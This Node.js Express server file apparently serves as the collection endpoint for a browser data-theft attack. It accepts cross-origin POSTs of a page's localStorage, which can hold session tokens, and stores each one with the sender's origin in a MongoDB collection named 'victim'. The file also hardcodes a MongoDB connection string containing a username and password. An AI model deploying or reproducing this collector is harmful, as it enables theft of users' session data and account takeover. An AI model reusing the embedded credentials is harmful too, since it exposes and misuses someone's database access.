import express from "express";
import mongoose from "mongoose";
import cors from "cors";

const app = express();

app.use(cors());
app.use(express.json({ limit: "10mb" }));

await mongoose.connect(
  "mongodb+srv://procodrr:TepqrStSouQ9uLWo@cluster0.wmifv.mongodb.net/testApp?retryWrites=true&w=majority&appName=Cluster0"
);

const victimSchema = new mongoose.Schema({
  localStorage: {},
  website: String,
});

const Victim = mongoose.model("victim", victimSchema);

app.use(express.static("./public"));

app.get("/", (req, res) => {
  res.end("Hello World!");
});

app.post("/", async (req, res) => {
  const { localStorage } = req.body;
  await Victim.create({
    localStorage: localStorage,
    website: req.headers.origin,
  });
  return res.status(200).end();
});

// Start server
app.listen(8000, () => console.log("Server running on http://localhost:8000"));
